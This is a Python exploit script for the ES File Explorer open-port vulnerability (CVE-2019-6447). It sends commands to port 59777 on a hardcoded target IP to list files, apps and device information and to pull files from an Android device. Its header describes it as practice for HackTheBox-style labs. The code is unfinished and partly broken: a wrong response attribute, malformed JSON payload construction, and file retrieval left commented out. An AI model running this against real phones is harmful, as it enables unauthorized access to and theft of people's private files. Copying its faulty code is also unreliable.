
import requests
import sys
import os
import argparse

##################################################################################################
#   Python script for retrieving files, apps, and device information from an Android device
#   Android device must be running ES File Server 
#   This script relies on the ES File Server vulnerability (CVE-2019-6447)
#
#   This script is used for penetration testing purposes on deliberately vulnerable machines
#   on sites such as HackTheBox and TryHackMe
#
#   This script is loosely based on the following scripts, cited below:
#   
#
#   
#   https://github.com/fs0c131y/ESFileExplorerOpenPortVuln/blob/master/poc.py
#   
#   and
#   
#
#   https://www.exploit-db.com/exploits/50070
#
#
##################################################################################################



cmd_options = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','listAppsThumbnail','getDeviceInfo']
get_file_options = ['getFile']

post_headers = {"Content-Type": "application/json"}

addr='10.10.10.247'

url='http://'+ addr + ':59777'

total_filelist = []


def fetch_android_file(machine_name, filename):
    res = requests.get(url + '/' + filename)
    retrieved_file = machine_name + '_' + filename
    if res.status == 200:
        with open(retrieved_file, 'wb') as f:
            f.write(res.content)


def get_all_files(file_list):
    for file_elem in file_list:
        if file_elem["type"] == "file":
            filename = file_elem["name"]
            print("file:", filename)
            #fetch_android_file(filename)
        else:
            print("Not a valid file")



def setup_options():
    parser = argparse.ArgumentParser(description='Retrieve files from an Android device, exploiting the ES File Explorer vulnerability (CVE-2019-6447)')
    parser.add_argument('-cmd', nargs=1, choices=cmd_options, default=cmd_options[0], help='The command to be executed on the ES File Explorer')
    #parser.add_argument('cmd_get', nargs=1, choices=get_file_options, help='Retrieve individual file or all files on Android device')
    #parser.add_argument('ip', dest='addr', help='IP address of target machine')
    parser.add_argument('-ip', nargs='?', default=addr,  help='IP address of target machine')
    subparsers = parser.add_subparsers()
    subparser_get_file = subparsers.add_parser('getFile')
    subparser_get_file.add_argument('-file', type=int, nargs='?',  help='Index number of file to retrieve from generated list of all files on target device')
    #subparser_get_file.set_defaults(func=get_all_files)
    args = parser.parse_args()
    #get_file_args = subparser_get_file.args()
    #return args, get_file_args
    return args

def basic_command():
    args = setup_options()
    #args, get_file_args = setup_options()
    #cmd=args.cmd[0]
    cmd=args.cmd
    getfile_cmd=args.file
    payload_data = '{"command":' + cmd + '}'
    print("args:", args)
    print("cmd:", cmd)
    #print("Get file args:", get_file_args)
    print("Get file args:", getfile_cmd)

    if cmd == 'listFiles':
        print("listFiles command successfully received")
        res = requests.post(url, headers=post_headers, data=payload_data)
        if res and res.status_code == 200: 
            with open("file_list.txt",'wb') as f:
                f.write(res.content)
            ##total_filelist = res.content
            ##print("All files and folders on target device: ", total_filelist)
    #if cmd == "getFile":
    if getfile_cmd:
        #total_filelist="file_list.txt"
        with open("file_list.txt", "r") as f:
            total_filelist = [line.rstrip() for line in f]
        print("All files and folders on target device: ", total_filelist)
        print("Which file(s) would you like to retrieve?")
        ##filelist=[file_elem for file_elem in total_filelist if (file_elem["type"] == "file")]
        ##print("Filelist: ", filelist)
        #file_index = int(input())
        ##print("file index chosen: ", file_index)



if __name__ == '__main__':
    basic_command()
